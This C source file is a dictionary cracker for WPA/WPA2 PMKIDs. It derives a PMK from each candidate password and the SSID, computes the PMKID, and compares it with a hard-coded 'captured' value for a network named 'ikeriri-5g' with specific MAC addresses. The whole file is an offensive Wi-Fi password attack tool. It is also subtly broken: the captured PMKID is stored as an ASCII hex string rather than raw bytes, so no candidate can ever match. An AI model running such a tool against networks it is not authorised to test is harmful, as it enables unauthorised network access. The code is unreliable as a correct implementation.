#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/sha.h>

// Function to print MAC address in human-readable form
void print_mac(const unsigned char *mac) {
    printf("%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// Function to calculate PMK using PBKDF2-HMAC-SHA1
void calculate_pmk(const char *password, const unsigned char *essid, int essid_len, unsigned char *pmk) {
    PKCS5_PBKDF2_HMAC(password, strlen(password), essid, essid_len, 4096, EVP_sha1(), 32, pmk);
}

// Function to calculate the PMKID
void calculate_pmkid(const unsigned char *pmk, const unsigned char *mac_ap, const unsigned char *mac_cl, unsigned char *pmkid) {
    unsigned char data[100];
    snprintf((char *)data, sizeof(data), "PMK Name");
    memcpy(data + strlen("PMK Name"), mac_ap, 6);
    memcpy(data + strlen("PMK Name") + 6, mac_cl, 6);

    unsigned int hmac_len;
    HMAC(EVP_sha1(), pmk, 32, data, strlen("PMK Name") + 12, pmkid, &hmac_len);
}

// Function to crack PMKID
void crack_pmkid(const unsigned char *pmkid, const unsigned char *essid, int essid_len, const unsigned char *mac_ap, const unsigned char *mac_cl, const char *passlist[], int passlist_size) {
    printf("\033[95m\n");
    printf("PMKID:                    ");
    for (int i = 0; i < 16; i++) printf("%02x", pmkid[i]);
    printf("\nSSID:                     %s\n", essid);
    printf("AP MAC Address:           ");
    print_mac(mac_ap);
    printf("\nClient MAC Address:       ");
    print_mac(mac_cl);
    printf("\n\033[0m");

    printf("\033[1m\33[33mAttempting to crack password...\n\033[0m");

    unsigned char pmk[32];
    unsigned char try_pmkid[20];  // HMAC-SHA1 generates 20 bytes

    for (int i = 0; i < passlist_size; i++) {
        const char *password = passlist[i];

        // 1. Calculate PMK
        calculate_pmk(password, essid, essid_len, pmk);

        // 2. Calculate PMKID
        calculate_pmkid(pmk, mac_ap, mac_cl, try_pmkid);

        // 3. Check if the computed PMKID matches the captured PMKID
        if (memcmp(try_pmkid, pmkid, 16) == 0) {
            printf("\033[92m");
            for (int j = 0; j < 16; j++) printf("%02x", try_pmkid[j]);
            printf(" - Matches captured PMKID\n");
            printf("Password Cracked!\n\033[0m");
            printf("SSID:             %s\n", essid);
            printf("Password:         %s\n", password);
            return;
        }
        // Print the current PMKID being tested
        for (int j = 0; j < 16; j++) printf("%02x", try_pmkid[j]);
        printf("\n");
    }

    printf("\033[91m\nFailed to crack password. It may help to try a different passwords list.\033[0m\n");
}

int main() {
    // Example PMKID, ESSID, MAC addresses, and password list for testing
    unsigned char pmkid[33] = "b9c9f71f0c96f62b6c11f545d2dff41b";
    unsigned char essid[] = "ikeriri-5g";
    unsigned char mac_ap[6] = { 0x50, 0x0f, 0x80, 0x70, 0x18, 0xd0 };// 500f807018d0
    unsigned char mac_cl[6] = { 0x40, 0x40, 0xa7, 0x50, 0x73, 0xdb };// 4040a75073db
    const char *passlist[] = { "password123", "letmein", "12345678", "wireshark" };  // Example passwords
    int passlist_size = sizeof(passlist) / sizeof(passlist[0]);

    // Call the function to crack the PMKID
    crack_pmkid(pmkid, essid, sizeof(essid) - 1, mac_ap, mac_cl, passlist, passlist_size);

    return 0;
}